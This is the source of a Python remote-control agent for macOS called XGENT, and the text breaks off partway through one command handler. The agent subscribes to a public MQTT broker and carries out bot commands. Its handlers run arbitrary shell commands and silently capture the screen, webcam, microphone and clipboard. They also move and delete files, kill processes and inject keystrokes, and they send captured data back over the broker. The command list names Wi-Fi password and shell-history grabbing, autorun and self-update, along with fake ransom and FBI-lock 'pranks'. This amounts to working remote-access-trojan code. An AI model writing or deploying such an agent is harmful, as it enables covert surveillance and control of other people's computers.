"""Клиент XGENT для macOS (MacBook).

Подключается к публичному MQTT-брокеру, слушает команды бота
и выполняет их на этой машине.
"""
import base64
import io
import json
import logging
import os
import plistlib
import random
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path
from logging.handlers import RotatingFileHandler

try:
    import fcntl
except ImportError:
    fcntl = None  # type: ignore

import paho.mqtt.client as mqtt
import psutil

from config import (
    CONFIG_DIR,
    DEVICE_ID,
    DEVICE_NAME,
    ENCRYPT_PAYLOAD,
    HEARTBEAT_INTERVAL,
    MQTT_BROKER,
    MQTT_PASSWORD,
    MQTT_PORT,
    MQTT_PREFIX,
    MQTT_TLS,
    MQTT_USERNAME,
    PLATFORM,
    VERSION,
)
from crypto import sign_message, verify_message
from xgencrypto import decrypt_payload, encrypt_payload

log = logging.getLogger("xgent.mcs")

_lock_file = None


def acquire_instance_lock() -> bool:
    """Гарантирует, что запущен ровно один экземпляр агента на машине."""
    global _lock_file
    lock_path = os.path.join(tempfile.gettempdir(), "xgent_mcs.lock")
    try:
        _lock_file = open(lock_path, "a+")
        if fcntl:
            fcntl.flock(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
        _lock_file.seek(0)
        _lock_file.truncate()
        _lock_file.write(str(os.getpid()) + "\n")
        _lock_file.flush()
        return True
    except (IOError, OSError):
        return False

SUPPORTED_COMMANDS = (
    "open_url", "notify", "sound", "status_request", "screenshot", "webcam",
    "sysinfo", "processes", "battery", "network", "services", "clipboard",
    "clipboard_set", "kill_process", "disks", "volume_set",
    "mic", "shell", "open_app", "capabilities", "lock", "volume_toggle",
    "power", "stop",
    "dir_list", "file_get", "file_put", "file_del", "find_file", "path_open",
    "ext_ip", "geo_location", "screen_off", "screensaver_on", "wallpaper_set",
    "msgbox_spam", "type_text", "hotkey",
    "proc_kill_name", "wifi_info", "usb_devices", "startup_list",
    "env_get", "netstat", "download_url",
    "prank_screamer", "prank_rickroll", "prank_matrix", "prank_siren",
    "prank_shout_tts", "prank_swap_mouse", "prank_crazy_cursor", "prank_hide_desktop",
    "prank_dancing_windows", "prank_black_screen", "prank_random_site",
    "display_brightness", "display_night_light", "display_rotate",
    "net_wifi_passwords", "net_bluetooth_list", "storage_smart",
    "sys_installed_apps", "sys_history_cmd",
    # Режим ожидания (Watchdog) и автозапуск
    "standby_sleep", "wake", "autorun_status", "autorun_enable", "autorun_disable",
    # Системные утилиты и диагностика
    "sys_uptime", "sys_clean_temp", "net_ping",
    # Расширенная матрица приколов
    "prank_bsod", "prank_fake_update", "prank_toast_spam", "prank_keyboard_disco",
    "prank_beep_morse", "prank_open_notepad_type", "prank_hacker_typer",
    "prank_sound_spooky", "prank_sound_fart", "prank_minimize_all",
    "prank_open_calc_spam", "prank_invert_screen", "prank_slow_mouse",
    "prank_random_clicks", "prank_paste_clipboard_spam", "prank_type_reversed",
    "prank_volume_jump", "prank_say_whisper", "prank_fake_virus", "prank_open_cd",
    "prank_change_wallpaper", "prank_restore_wallpaper", "prank_speak_time",
    "prank_rickroll_terminal", "prank_screen_off_brief", "prank_alert_loop",
    "prank_open_browser_memes", "prank_glitch_cursor", "prank_shake_window",
    # Новые мега-приколы и троллинг
    "prank_meme_wallpaper", "prank_caps_disco", "prank_cursor_circle",
    "prank_fake_error_spam", "prank_fake_delete_sys32", "prank_ghost_typer",
    "prank_fbi_lock", "prank_cat_invaders", "prank_fake_ransom_cats",
    "prank_nyan_stream", "prank_random_beeps", "prank_confetti_winner",
    "prank_low_battery_fake", "prank_earthquake", "prank_laugh_track",
    "prank_stop_all",
    "agent_update", "uninstall_agent",
)


def _humanize_seconds(secs):
    if secs is None: return None
    try: secs = int(secs)
    except: return None
    if secs < 0: return None
    hours, remainder = divmod(secs, 3600)
    minutes, _ = divmod(remainder, 60)
    return f"{hours}ч {minutes}мин" if hours else f"{minutes}мин"

def _format_battery(battery):
    if battery is None:
        return {"available": False}
    secsleft = battery.secsleft
    if secsleft in (psutil.POWER_TIME_UNLIMITED, psutil.POWER_TIME_UNKNOWN):
        secsleft = None
    plugged = bool(battery.power_plugged)
    return {
        "available": True,
        "percent": round(float(battery.percent), 1),
        "power_plugged": plugged,
        "secsleft": int(secsleft) if secsleft is not None else None,
        "time_left": _humanize_seconds(secsleft),
        "state": "charging" if plugged else "on_battery",
    }

def _format_network(addrs, stats, io_stats):
    interfaces = []
    for name in sorted(addrs.keys()):
        nic_addrs = addrs[name]
        nic_stats = stats.get(name)
        ipv4 = ipv6 = mac = None
        for a in nic_addrs:
            if a.family == socket.AF_INET: ipv4 = a.address
            elif a.family == socket.AF_INET6: ipv6 = a.address.split("%")[0]
            elif a.family == psutil.AF_LINK: mac = a.address
        interfaces.append({
            "name": name,
            "ipv4": ipv4,
            "ipv6": ipv6,
            "mac": mac,
            "up": bool(nic_stats.isup) if nic_stats else False,
            "speed_mbps": nic_stats.speed if nic_stats else 0,
        })
    totals = {"bytes_sent": 0, "bytes_recv": 0}
    for counters in (io_stats or {}).values():
        totals["bytes_sent"] += counters.bytes_sent
        totals["bytes_recv"] += counters.bytes_recv
    return {"interfaces": interfaces, "totals": totals}

def _format_services():
    try:
        out = subprocess.check_output(["launchctl", "list"], text=True)
        lines = out.strip().split("\n")[1:]
        total = len(lines)
        running = sum(1 for line in lines if not line.startswith("-"))
        return {"total": total, "running": running, "stopped": total - running, "failed_auto_start": []}
    except Exception:
        return {"total": 0, "running": 0, "stopped": 0, "failed_auto_start": []}

def _format_processes(procs, top_n=5):
    items = []
    for proc in procs:
        try:
            info = proc.info
            name = info.get("name")
            mem = info.get("memory_percent") or 0
            items.append((name, mem, info.get("pid")))
        except Exception: pass
    items.sort(key=lambda x: (x[1] or 0), reverse=True)
    top = items[:top_n]
    lines = [f"{n}: {m:.1f}%" for n, m, _ in top if n]
    structured = [{"name": n, "pid": p, "mem_percent": round(m, 1)} for n, m, p in top if n]
    return {"lines": lines, "top": structured}


def _primary_mac():
    """Первый валидный MAC из сетевых интерфейсов (для Wake-on-LAN)."""
    for addrs in psutil.net_if_addrs().values():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac = (addr.address or "").strip()
                if mac and mac.lower().replace(":", "-") != "00-00-00-00-00-00":
                    return mac
    return None


def _format_disks(partitions):
    """Список дисков с размерами."""
    disks = []
    for part in partitions:
        try:
            usage = psutil.disk_usage(part.mountpoint)
        except Exception:
            continue
        disks.append({
            "device": part.device,
            "mountpoint": part.mountpoint,
            "fstype": part.fstype,
            "total_gb": round(usage.total / (1024 ** 3), 1),
            "free_gb": round(usage.free / (1024 ** 3), 1),
            "percent": round(usage.percent, 1),
        })
    return disks

class XgentClient:
    def __init__(self, on_stop_requested=None) -> None:
        self.on_stop_requested = on_stop_requested
        self._running = threading.Event()
        self._running.set()
        self._client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=f"xgent-mcs-{DEVICE_ID}",
            protocol=mqtt.MQTTv311,
        )
        self._client.reconnect_delay_set(min_delay=1, max_delay=120)
        self._client.on_connect = self._on_connect
        self._client.on_connect_fail = self._on_connect_fail
        self._client.on_disconnect = self._on_disconnect
        self._client.on_message = self._on_message
        self._heartbeat = threading.Thread(
            target=self._heartbeat_loop, name="xgent-heartbeat", daemon=True
        )
        self._standby = False
        self._command_context = threading.local()
        self._handlers = {
            "open_url": self._do_open_url,
            "notify": self._do_notify,
            "sound": self._do_sound,
            "status_request": self._do_status_request,
            "screenshot": self._do_screenshot,
            "webcam": self._do_webcam,
            "sysinfo": self._do_sysinfo,
            "processes": self._do_processes,
            "battery": self._do_battery,
            "network": self._do_network,
            "services": self._do_services,
            "clipboard": self._do_clipboard,
            "clipboard_set": self._do_clipboard_set,
            "kill_process": self._do_kill_process,
            "disks": self._do_disks,
            "volume_set": self._do_volume_set,
            "mic": self._do_mic,
            "shell": self._do_shell,
            "open_app": self._do_open_app,
            "capabilities": self._do_capabilities,
            "lock": self._do_lock_screen,
            "volume_toggle": self._do_volume_toggle,
            "power": self._do_power,
            "stop": self._do_stop,
            "dir_list": self._do_dir_list,
            "file_get": self._do_file_get,
            "file_put": self._do_file_put,
            "file_del": self._do_file_del,
            "find_file": self._do_find_file,
            "path_open": self._do_path_open,
            "ext_ip": self._do_ext_ip,
            "geo_location": self._do_geo_location,
            "screen_off": self._do_screen_off,
            "screensaver_on": self._do_screensaver_on,
            "wallpaper_set": self._do_wallpaper_set,
            "msgbox_spam": self._do_msgbox_spam,
            "type_text": self._do_type_text,
            "hotkey": self._do_hotkey,
            "proc_kill_name": self._do_proc_kill_name,
            "wifi_info": self._do_wifi_info,
            "usb_devices": self._do_usb_devices,
            "startup_list": self._do_startup_list,
            "env_get": self._do_env_get,
            "netstat": self._do_netstat,
            "download_url": self._do_download_url,
            "prank_screamer": self._do_prank_screamer,
            "prank_rickroll": self._do_prank_rickroll,
            "prank_matrix": self._do_prank_matrix,
            "prank_siren": self._do_prank_siren,
            "prank_shout_tts": self._do_prank_shout_tts,
            "prank_swap_mouse": self._do_prank_swap_mouse,
            "prank_crazy_cursor": self._do_prank_crazy_cursor,
            "prank_hide_desktop": self._do_prank_hide_desktop,
            "prank_dancing_windows": self._do_prank_dancing_windows,
            "prank_black_screen": self._do_prank_black_screen,
            "prank_random_site": self._do_prank_random_site,
            "display_brightness": self._do_display_brightness,
            "display_night_light": self._do_display_night_light,
            "display_rotate": self._do_display_rotate,
            "net_wifi_passwords": self._do_net_wifi_passwords,
            "net_bluetooth_list": self._do_net_bluetooth_list,
            "storage_smart": self._do_storage_smart,
            "sys_installed_apps": self._do_sys_installed_apps,
            "sys_history_cmd": self._do_sys_history_cmd,
            # Режим ожидания (Watchdog) и автозапуск
            "standby_sleep": self._do_standby_sleep,
            "wake": self._do_wake,
            "autorun_status": self._do_autorun_status,
            "autorun_enable": self._do_autorun_enable,
            "autorun_disable": self._do_autorun_disable,
            # Системные утилиты и диагностика
            "sys_uptime": self._do_sys_uptime,
            "sys_clean_temp": self._do_sys_clean_temp,
            "net_ping": self._do_net_ping,
            # Расширенная матрица приколов
            "prank_bsod": self._do_prank_bsod,
            "prank_fake_update": self._do_prank_fake_update,
            "prank_toast_spam": self._do_prank_toast_spam,
            "prank_keyboard_disco": self._do_prank_keyboard_disco,
            "prank_beep_morse": self._do_prank_beep_morse,
            "prank_open_notepad_type": self._do_prank_open_notepad_type,
            "prank_hacker_typer": self._do_prank_hacker_typer,
            "prank_sound_spooky": self._do_prank_sound_spooky,
            "prank_sound_fart": self._do_prank_sound_fart,
            "prank_minimize_all": self._do_prank_minimize_all,
            "prank_open_calc_spam": self._do_prank_open_calc_spam,
            "prank_invert_screen": self._do_prank_invert_screen,
            "prank_slow_mouse": self._do_prank_slow_mouse,
            "prank_random_clicks": self._do_prank_random_clicks,
            "prank_paste_clipboard_spam": self._do_prank_paste_clipboard_spam,
            "prank_type_reversed": self._do_prank_type_reversed,
            "prank_volume_jump": self._do_prank_volume_jump,
            "prank_say_whisper": self._do_prank_say_whisper,
            "prank_fake_virus": self._do_prank_fake_virus,
            "prank_open_cd": self._do_prank_open_cd,
            "prank_change_wallpaper": self._do_prank_change_wallpaper,
            "prank_restore_wallpaper": self._do_prank_restore_wallpaper,
            "prank_speak_time": self._do_prank_speak_time,
            "prank_rickroll_terminal": self._do_prank_rickroll_terminal,
            "prank_screen_off_brief": self._do_prank_screen_off_brief,
            "prank_alert_loop": self._do_prank_alert_loop,
            "prank_open_browser_memes": self._do_prank_open_browser_memes,
            "prank_glitch_cursor": self._do_prank_glitch_cursor,
            "prank_shake_window": self._do_prank_shake_window,
            "prank_meme_wallpaper": self._do_prank_meme_wallpaper,
            "prank_caps_disco": self._do_prank_caps_disco,
            "prank_cursor_circle": self._do_prank_cursor_circle,
            "prank_fake_error_spam": self._do_prank_fake_error_spam,
            "prank_fake_delete_sys32": self._do_prank_fake_delete_sys32,
            "prank_ghost_typer": self._do_prank_ghost_typer,
            "prank_fbi_lock": self._do_prank_fbi_lock,
            "prank_cat_invaders": self._do_prank_cat_invaders,
            "prank_fake_ransom_cats": self._do_prank_fake_ransom_cats,
            "prank_nyan_stream": self._do_prank_nyan_stream,
            "prank_random_beeps": self._do_prank_random_beeps,
            "prank_confetti_winner": self._do_prank_confetti_winner,
            "prank_low_battery_fake": self._do_prank_low_battery_fake,
            "prank_earthquake": self._do_prank_earthquake,
            "prank_laugh_track": self._do_prank_laugh_track,
            "prank_stop_all": self._do_prank_stop_all,
            "agent_update": self._do_agent_update,
            "uninstall_agent": self._do_uninstall_agent,
        }
        assert set(self._handlers) == set(SUPPORTED_COMMANDS)


    @property
    def is_running(self) -> bool:
        return self._running.is_set()

    def start(self) -> None:
        if MQTT_TLS:
            self._client.tls_set()  # системные CA; без отключения проверки сертификата
        if MQTT_USERNAME:
            log.info("MQTT auth: %s (TLS=%s", MQTT_USERNAME, MQTT_TLS)
            self._client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

        # LWT: мгновенный offline-статус при разрыве соединения (подписанный).
        will_topic = f"{MQTT_PREFIX}/{DEVICE_ID}/status"
        will_body = {
            "type": "status", "device_id": DEVICE_ID, "name": DEVICE_NAME,
            "os": PLATFORM, "version": VERSION, "status": "offline",
        }
        will_payload = sign_message(
            encrypt_payload(will_body) if ENCRYPT_PAYLOAD else will_body
        )
        # QoS 1 делает LWT надёжным при резком обрыве Wi‑Fi или процесса.
        self._client.will_set(will_topic, json.dumps(will_payload, ensure_ascii=False), qos=1, retain=False)

        self._client.connect_async(MQTT_BROKER, MQTT_PORT, keepalive=60)
        self._client.loop_start()
        self._heartbeat.start()
        log.info("Клиент запущен: %s (%s)", DEVICE_NAME, DEVICE_ID)

    def stop(self) -> None:
        self._running.clear()
        self._client.loop_stop()
        self._client.disconnect()
        log.info("Клиент остановлен")

    def request_stop(self) -> None:
        self._running.clear()
        if self.on_stop_requested: self.on_stop_requested()

    def _on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            client.subscribe(f"{MQTT_PREFIX}/{DEVICE_ID}/cmd", qos=0)
            client.subscribe(f"{MQTT_PREFIX}/all/cmd", qos=0)
            log.info("Подключено к %s:%s", MQTT_BROKER, MQTT_PORT)
            self._publish_status()
        else:
            log.warning("Не удалось подключиться к брокеру: %s", reason_code)

    def _on_connect_fail(self, client, userdata, reason_code=None):
        log.warning("Попытка подключения к брокеру не удалась (код %s)", reason_code)

    def _on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        if not self._running.is_set(): return
        log.warning("Отключено от брокера (код %s); переподключение…", reason_code)

    def _on_message(self, client, userdata, message):
        try:
            data = json.loads(message.payload.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            log.warning("Получен некорректный JSON из топика %s", message.topic)
            return
        payload = verify_message(data)
        if payload is None:
            log.warning("Сообщение с неверной подписью/ts отброшено из %s", message.topic)
            return
        if ENCRYPT_PAYLOAD or ("enc" in payload):
            inner = decrypt_payload(payload)
            if inner is None:
                log.warning("Не удалось расшифровать команду из %s", message.topic)
                return
            payload = inner
        self._dispatch(payload)

    def _dispatch(self, payload: dict) -> None:
        action = payload.get("type")
        cmd_id = payload.get("id")
        if getattr(self, "_standby", False) and action not in ("wake", "status_request"):
            log.info("Команда %s отклонена: агент в режиме ожидания", action)
            self._publish_response(
                "output",
                {
                    "type": action,
                    "device_id": DEVICE_ID,
                    "ok": False,
                    "text": "💤 Агент находится в спящем режиме (Standby).\nНажмите «☀️ Пробудить агента» в меню питания, чтобы возобновить работу.",
                },
            )
            self._publish_ack(action, "ok", cmd_id=cmd_id)
            return

        handler = self._handlers.get(action)
        if handler is None:
            log.warning("Неизвестная команда: %s", action)
            self._publish_ack(action or "?", "error", detail="unknown_command", cmd_id=cmd_id)
            return
        log.info("Выполняю команду: %s", action)
        self._publish_ack(action, "received", cmd_id=cmd_id)
        self._run_threaded(action, cmd_id, handler, payload)

    def _run_threaded(self, action, cmd_id, func, payload) -> None:
        def _worker() -> None:
            self._command_context.cmd_id = cmd_id
            try:
                func(payload)
            except Exception:
                log.exception("Команда %s завершилась ошибкой", action)
                self._publish_ack(action, "error", detail="exception", cmd_id=cmd_id)
            else:
                self._publish_ack(action, "ok", cmd_id=cmd_id)
            finally:
                try:
                    del self._command_context.cmd_id
                except AttributeError:
                    pass
        threading.Thread(target=_worker, name=f"xgent-cmd-{action}", daemon=True).start()

    def _publish_status(self) -> None:
        status = "standby" if getattr(self, "_standby", False) else "online"
        payload = {
            "type": "status", "device_id": DEVICE_ID, "name": DEVICE_NAME,
            "os": PLATFORM, "version": VERSION, "status": status,
        }
        body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
        envelope = sign_message(body)
        self._client.publish(f"{MQTT_PREFIX}/{DEVICE_ID}/status", json.dumps(envelope, ensure_ascii=False), qos=1)

    def _publish_response(self, topic_suffix: str, payload: dict) -> None:
        cmd_id = getattr(self._command_context, "cmd_id", None)
        if cmd_id is not None and "id" not in payload:
            payload = {**payload, "id": cmd_id}
        body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
        envelope = sign_message(body)
        # Ответ обновления должен пережить немедленный перезапуск агента.
        info = self._client.publish(
            f"{MQTT_PREFIX}/{DEVICE_ID}/{topic_suffix}",
            json.dumps(envelope, ensure_ascii=False),
            qos=1,
        )
        if info.rc != mqtt.MQTT_ERR_SUCCESS:
            log.warning("Не удалось опубликовать ответ %s (rc=%s)", topic_suffix, info.rc)
        else:
            try:
                info.wait_for_publish(timeout=3.0)
            except Exception:
                log.exception("Не дождались доставки ответа %s", topic_suffix)

    def _publish_ack(self, action, status, detail=None, cmd_id=None) -> None:
        payload = {"type": "ack", "device_id": DEVICE_ID, "action": action, "status": status}
        if cmd_id is not None: payload["id"] = cmd_id
        if detail: payload["detail"] = detail
        self._publish_response("ack", payload)

    def _heartbeat_loop(self) -> None:
        while self._running.is_set():
            time.sleep(HEARTBEAT_INTERVAL + random.uniform(0, 10))
            if self._running.is_set() and self._client.is_connected():
                self._publish_status()

    def _do_open_url(self, payload: dict) -> None:
        url = payload.get("url", "")
        if url:
            subprocess.run(["open", url], check=False)
            self._notify_text(f"Открываю: {url}")

    def _do_notify(self, payload: dict) -> None:
        self._notify_text(payload.get("text", ""))

    def _notify_text(self, text: str) -> None:
        if not text: return
        script = f'display notification {json.dumps(text)} with title "XGENT"'
        subprocess.run(["osascript", "-e", script], check=False)

    def _do_sound(self, payload: dict) -> None:
        text = payload.get("text", "")
        if not text.strip() or text.strip().lower() == "beep":
            played = False
            for snd in ("/System/Library/Sounds/Ping.aiff", "/System/Library/Sounds/Sosumi.aiff", "/System/Library/Sounds/Tink.aiff", "/System/Library/Sounds/Glass.aiff"):
                if os.path.exists(snd):
                    subprocess.run(["afplay", snd], check=False)
                    played = True
                    break
            if not played:
                subprocess.run(["osascript", "-e", "beep 2"], check=False)
        else:
            subprocess.run(["say", text], check=False)

    def _do_status_request(self, payload: dict) -> None:
        self._publish_status()

    def _do_screenshot(self, payload: dict) -> None:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            res = subprocess.run(["screencapture", "-x", tmp_path], capture_output=True, timeout=10)
            if res.returncode != 0 or not os.path.exists(tmp_path) or os.path.getsize(tmp_path) == 0:
                log.warning("screencapture вернул ошибку rc=%s: %s", res.returncode, res.stderr)
                self._publish_response("screenshot", {
                    "type": "screenshot",
                    "device_id": DEVICE_ID,
                    "image": None,
                    "error": "Отказано в доступе (TCC). Выдайте разрешение «Запись экрана» в Настройках Mac.",
                })
                return
            from PIL import Image
            img = Image.open(tmp_path)
            img.thumbnail((1600, 1200))
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="JPEG", quality=80, optimize=True)
            b64 = base64.b64encode(buf.getvalue()).decode("ascii")
            self._publish_response("screenshot", {"type": "screenshot", "device_id": DEVICE_ID, "image": b64})
            log.info("Скриншот отправлен")
        except Exception as exc:
            log.exception("Ошибка скриншота")
            self._publish_response("screenshot", {
                "type": "screenshot",
                "device_id": DEVICE_ID,
                "image": None,
                "error": f"Ошибка: {exc}",
            })
        finally:
            if os.path.exists(tmp_path): os.unlink(tmp_path)

    def _do_webcam(self, payload: dict) -> None:
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            try:
                if not cap.isOpened():
                    log.warning("Веб-камера недоступна (isOpened == False)")
                    self._publish_response("webcam", {
                        "type": "webcam",
                        "device_id": DEVICE_ID,
                        "image": None,
                        "error": "Камера недоступна. Выдайте разрешение «Камера» в Настройках Mac.",
                    })
                    return
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
                for _ in range(10): cap.read()
                ret, frame = cap.read()
                if not ret or frame is None:
                    self._publish_response("webcam", {
                        "type": "webcam",
                        "device_id": DEVICE_ID,
                        "image": None,
                        "error": "Не удалось прочитать кадр с веб-камеры.",
                    })
                    return
                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                b64 = base64.b64encode(buffer).decode("ascii")
                self._publish_response("webcam", {"type": "webcam", "device_id": DEVICE_ID, "image": b64})
                log.info("Снимок с веб-камеры отправлен")
            finally:
                cap.release()
        except Exception as exc:
            log.exception("Ошибка веб-камеры")
            self._publish_response("webcam", {
                "type": "webcam",
                "device_id": DEVICE_ID,
                "image": None,
                "error": f"Ошибка камеры: {exc}",
            })


    def _do_sysinfo(self, payload: dict) -> None:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("/")
        boot = psutil.boot_time()
        uptime_sec = int(time.time() - boot)
        uptime_str = _humanize_seconds(uptime_sec) or "0мин"
        battery = _format_battery(psutil.sensors_battery())

        self._publish_response("sysinfo", {
            "type": "sysinfo", "device_id": DEVICE_ID, "hostname": socket.gethostname(),
            "mac": _primary_mac(),
            "os": PLATFORM, "cpu_percent": round(cpu, 1),
            "ram_used_gb": round(mem.used / (1024 ** 3), 1),
            "ram_total_gb": round(mem.total / (1024 ** 3), 1),
            "ram_percent": round(mem.percent, 1),
            "disk_used_gb": round(disk.used / (1024 ** 3), 1),
            "disk_total_gb": round(disk.total / (1024 ** 3), 1),
            "disk_percent": round(disk.percent, 1),
            "boot_time_sec": int(boot), "uptime": uptime_str, "battery": battery,
        })

    def _do_processes(self, payload: dict) -> None:
        procs = list(psutil.process_iter(["pid", "name", "memory_percent"]))
        top_n = int(payload.get("top_n", 5) or 5)
        top_n = max(1, min(top_n, 25))
        result = _format_processes(procs, top_n=top_n)
        self._publish_response("processes", {
            "type": "processes", "device_id": DEVICE_ID,
            "lines": result["lines"], "top": result["top"],
        })

    def _do_battery(self, payload: dict) -> None:
        battery = _format_battery(psutil.sensors_battery())
        self._publish_response("battery", {"type": "battery", "device_id": DEVICE_ID, **battery})

    def _do_network(self, payload: dict) -> None:
        result = _format_network(psutil.net_if_addrs(), psutil.net_if_stats(), psutil.net_io_counters(pernic=True))
        self._publish_response("network", {"type": "network", "device_id": DEVICE_ID, "interfaces": result["interfaces"], "totals": result["totals"]})

    def _do_services(self, payload: dict) -> None:
        result = _format_services()
        self._publish_response("services", {"type": "services", "device_id": DEVICE_ID, **result})

    def _do_clipboard(self, payload: dict) -> None:
        import pyperclip
        text = pyperclip.paste() or ""
        self._publish_response("clipboard", {"type": "clipboard", "device_id": DEVICE_ID, "text": text})

    def _do_clipboard_set(self, payload: dict) -> None:
        """Записать текст в буфер обмена (pbcopy)."""
        text = str(payload.get("text", ""))
        subprocess.run(["pbcopy"], input=text.encode("utf-8"), check=False)
        self._publish_response("clipboard_set", {"type": "clipboard_set", "device_id": DEVICE_ID, "length": len(text)})
        log.info("В буфер обмена записано %d символов", len(text))

    def _do_kill_process(self, payload: dict) -> None:
        """Завершить процесс по PID (terminate, затем kill)."""
        pid = int(payload.get("pid", 0) or 0)
        proc = psutil.Process(pid)
        name = proc.name()
        log.info("kill_process: pid=%s (%s)", pid, name)
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except psutil.TimeoutExpired:
            proc.kill()
        self._publish_response("kill_process", {"type": "kill_process", "device_id": DEVICE_ID, "pid": pid, "name": name, "killed": True})

    def _do_disks(self, payload: dict) -> None:
        """Список дисков с размерами."""
        disks = _format_disks(psutil.disk_partitions())
        self._publish_response("disks", {
            "type": "disks", "device_id": DEVICE_ID, "disks": disks,
            "lines": [f"{d['device']} {d['free_gb']}/{d['total_gb']} ГБ свободно ({d['percent']}%)" for d in disks],
        })
        log.info("Список дисков отправлен")

    def _do_volume_set(self, payload: dict) -> None:
        """Установить общую громкость 0-100 (osascript)."""
        level = max(0, min(100, int(payload.get("level", 50) or 50)))
        subprocess.run(["osascript", "-e", f"set volume output volume {level}"], check=False)
        result = subprocess.run(["osascript", "-e", "output volume of (get volume settings)"], capture_output=True, text=True, check=False)
        try:
            current = int(result.stdout.strip())
        except ValueError:
            current = level
        self._publish_response("volume_set", {"type": "volume_set", "device_id": DEVICE_ID, "level": level, "current": current})
        log.info("Громкость установлена: %d%% (стало %d%%)", level, current)

    def _do_mic(self, payload: dict) -> None:
        try:
            import sounddevice as sd
            import soundfile as sf
            duration = int(payload.get("duration", 5))
            if duration <= 0 or duration > 60: duration = 5
            fs = 44100
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
            sd.wait()
            with tempfile.NamedTemporaryFile(suffix=".ogg", delete=False) as tmp:
                tmp_path = tmp.name
            try:
                sf.write(tmp_path, recording, fs)
                with open(tmp_path, "rb") as f:
                    b64 = base64.b64encode(f.read()).decode("ascii")
                self._publish_response("mic", {"type": "mic", "device_id": DEVICE_ID, "audio": b64})
                log.info("Запись микрофона отправлена (%d сек)", duration)
            finally:
                if os.path.exists(tmp_path): os.unlink(tmp_path)
        except Exception as exc:
            log.exception("Ошибка микрофона")
            self._publish_response("mic", {
                "type": "mic",
                "device_id": DEVICE_ID,
                "audio": None,
                "error": f"Ошибка микрофона: {exc}",
            })

    def _do_shell(self, payload: dict) -> None:
        cmd = (payload.get("command") or "").strip()
        if not cmd: return
        timeout_s = int(payload.get("timeout", 20))
        if timeout_s <= 0 or timeout_s > 60: timeout_s = 20
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout_s)
            output = result.stdout or ""
            if result.stderr: output += "\n[STDERR]\n" + result.stderr
            self._publish_response("shell", {"type": "shell", "device_id": DEVICE_ID, "output": output, "returncode": result.returncode})
        except subprocess.TimeoutExpired:
            self._publish_response("shell", {"type": "shell", "device_id": DEVICE_ID, "output": f"[TIMEOUT after {timeout_s}s]", "returncode": -1})

    def _do_open_app(self, payload: dict) -> None:
        app = (payload.get("app") or "").strip()
        if app: subprocess.run(["open", app], check=False)

    def _do_capabilities(self, payload: dict) -> None:
        self._publish_response("capabilities", {
            "type": "capabilities", "device_id": DEVICE_ID, "platform": PLATFORM,
            "version": VERSION, "hostname": socket.gethostname(),
            "commands": sorted(SUPPORTED_COMMANDS),
            "features": {"battery": True, "shell": True, "open_app": True, "mic": True, "clipboard": True}
        })

    def _do_lock_screen(self, payload: dict) -> None:
        subprocess.run(["pmset", "displaysleepnow"], check=False)

    def _do_volume_toggle(self, payload: dict) -> None:
        result = subprocess.run(["osascript", "-e", "output muted of (get volume settings)"], capture_output=True, text=True, check=False)
        is_muted = result.stdout.strip().lower() == "true"
        new_state = "false" if is_muted else "true"
        subprocess.run(["osascript", "-e", f"set volume output muted {new_state}"], check=False)

    def _do_proc_kill_name(self, payload: dict) -> None:
        low = (payload.get("name") or "").strip().lower()
        if not low:
            self._publish_response("proc_kill_name", {"type": "proc_kill_name",
                                                      "device_id": DEVICE_ID, "ok": False,
                                                      "error": "empty name", "count": 0})
            return
        killed, errors = [], []
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.info["pid"] == os.getpid():
                    continue
                if low in (proc.info.get("name") or "").lower():
                    proc.kill()
                    killed.append(proc.info["pid"])
            except Exception as exc:
                errors.append(str(exc))
        log.info("proc_kill_name(%s): %s", low, killed)
        self._publish_response("proc_kill_name", {"type": "proc_kill_name",
                                                  "device_id": DEVICE_ID, "ok": True,
                                                  "count": len(killed), "killed": killed[:20],
                                                  "errors": errors[:5]})

    def _do_wifi_info(self, payload: dict) -> None:
        ssid = signal = None
        try:
            out = subprocess.check_output(
                ["ipconfig", "getsummary", "en0"], text=True,
                stderr=subprocess.DEVNULL, timeout=10,
            )
            for line in out.splitlines():
                stripped = line.strip()
                if stripped.startswith("SSID") and ":" in stripped and " SSID " not in stripped:
                    ssid = stripped.split(":", 1)[1].strip() or None
                if stripped.startswith("agrCtlRSSI"):
                    signal = stripped.split(":", 1)[1].strip() + " dBm"
        except Exception:
            pass
        text = f"📶 Wi-Fi: {ssid or '—'} (сигнал: {signal or '—'})"
        self._publish_response("wifi_info", {"type": "wifi_info", "device_id": DEVICE_ID,
                                             "ok": bool(ssid), "text": text,
                                             "ssid": ssid, "signal": signal})

    def _do_usb_devices(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["system_profiler", "SPUSBDataType", "-detailLevel", "mini"],
                text=True, stderr=subprocess.DEVNULL, timeout=25,
            )
            items = [ln.strip() for ln in out.splitlines()
                     if ln.strip() and not ln.startswith("        ")]
            items = list(dict.fromkeys(items))[:25]
            text = "🔌 USB:\n" + "\n".join(f"• {i}" for i in items)
            ok = True
        except Exception as exc:
            items, text, ok = [], f"⚠️ USB: {exc}", False
        self._publish_response("usb_devices", {"type": "usb_devices", "device_id": DEVICE_ID,
                                               "ok": ok, "text": text, "items": items})

    def _do_startup_list(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["osascript", "-e",
